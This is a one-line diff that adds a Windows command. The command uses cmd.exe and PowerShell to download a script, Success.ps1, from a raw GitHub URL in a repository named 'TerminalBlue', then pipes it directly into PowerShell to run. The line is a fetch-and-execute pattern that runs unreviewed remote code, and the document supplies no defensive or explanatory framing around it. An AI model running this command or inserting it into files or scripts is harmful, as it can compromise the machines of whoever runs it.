@@ -1,0 +1,1 @@
+cmd.exe /c "powershell -c wget https://raw.githubusercontent.com/Tu5k4rr/TerminalBlue/master/Success.ps1 -Outfile success.ps1&& powershell -c Get-Content -Path .\success.ps1 | powershell -"
